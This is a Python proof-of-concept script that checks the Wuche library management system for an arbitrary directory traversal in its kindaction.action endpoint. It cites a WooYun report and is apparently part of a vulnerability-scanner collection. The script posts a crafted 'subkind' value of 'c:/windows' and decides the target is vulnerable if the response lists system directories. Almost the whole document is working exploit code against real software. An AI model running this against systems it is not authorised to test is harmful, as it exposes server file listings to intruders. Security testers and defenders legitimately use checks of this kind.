#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 五车图书管系统kindaction任意文件遍历
referer: http://www.wooyun.org/bugs/wooyun-2010-0128686
author: Lucifer
description: 文件kindaction.action中,参数subkind存在任意文件遍历。
'''
import sys
import json
import requests
import warnings
def run(url):
        result = ['五车图书管系统kindaction任意文件遍历','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data = {
            "filePath":"",
            "kind":"music",
            "curpage":1,
            "actionName":"",
            "subkind":"c:/windows",
            "pagesize":20,
            "curPage":1,
            "toPage":1
        }
        payload = "/5clib/kindaction.action"
        vulnurl = url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if req.status_code == 200 and r"system" in req.text:
                result[2]=  '存在'
                result[1]=vulnurl+"\npost: "+json.dumps(post_data, indent=4)
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
